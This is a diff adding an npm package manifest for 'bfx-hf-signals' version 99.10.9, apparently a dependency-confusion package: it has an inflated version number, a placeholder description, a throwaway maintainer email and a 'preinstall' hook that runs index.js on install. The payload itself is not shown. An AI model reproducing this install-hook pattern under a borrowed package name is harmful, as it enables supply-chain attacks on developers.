@@ -1,0 +1,39 @@
+{
+    "name": "bfx-hf-signals",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "bfx-hf-signals@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-tZJH60Rf4EqZtKs5kUkMJ7gpsMamJmR6KytfhBaV8/8SbHVWDxQZRD8D+ZeSypJmb+21xiez/p63kWZIvjpzfw==",
+        "shasum": "fb69a95f828b43f45abbc4907c7746265ae2b99e",
+        "tarball": "https://registry.npmjs.org/bfx-hf-signals/-/bfx-hf-signals-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5066,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJn9ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpFNQ/+MaMdzKnj4KQVdsw9rv5RJPtmJp+TbwfGLgQc+n0OCPYcoj4E\r\neVqFDIblJ8TDmt+LzGtNt9MdtFgq7lPoEvwwubnpyzoKrKikrAP8NCjS+J6x\r\n6X5wsgCxYR0gckJdIxc7yb456xjkurTERcEjQIcjRYOwaQdLQr+c7+XCaoBP\r\nzh73zmTKZZtnqvajVEtglZJpDUnbAkKER4z8Uz3bfCB+IPH7V6nhruar48s/\r\nAG25eLyYiFnRypH0llTBbDTOUej5jaoINFkGPl+719QgpbXPBsC/dDK1OLnR\r\nRhlCKFvSYVPQHa/6s5wW4EapgM3UTfSJAFxH0TENoKxFmDLFe9thoKmv1dnt\r\nEVqqqrrqFsxhi3zGSjB4EjaHGhA69wjOkA5x4GJnghBWmYaw4mslbsGFdGih\r\nZyw2F7UMFc8cwFs9O+YinWOOOKrsdUov/O0JULA1YVuK0XOWPiya4XYVCmNX\r\nL2NT/I9tNOQxz09TA5vohOUOHo4ia9qK6EuslNcVm+kJbM4c0c05IBkuj7B0\r\nQLFxxt96qhfHSVd7hneSSOvtRxxhMZ4U3MdqubHXR/xh4TLMVkjlq7Fs4tPV\r\n1VEB78CKGivSIcb1THCKHMy3quuKOoZTsIR9L6k2Ytun9G4tgo6Y0XJacxum\r\njARUlXSKd+qqsGVWxzwe6+sZjoQEVb04b20=\r\n=PK0L\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "inlsznpl",
+        "email": "inlsznpl@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "inlsznpl",
+            "email": "inlsznpl@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/bfx-hf-signals_99.10.9_1648138749129_0.39988308080195956"
+    },
+    "_hasShrinkwrap": false
+}
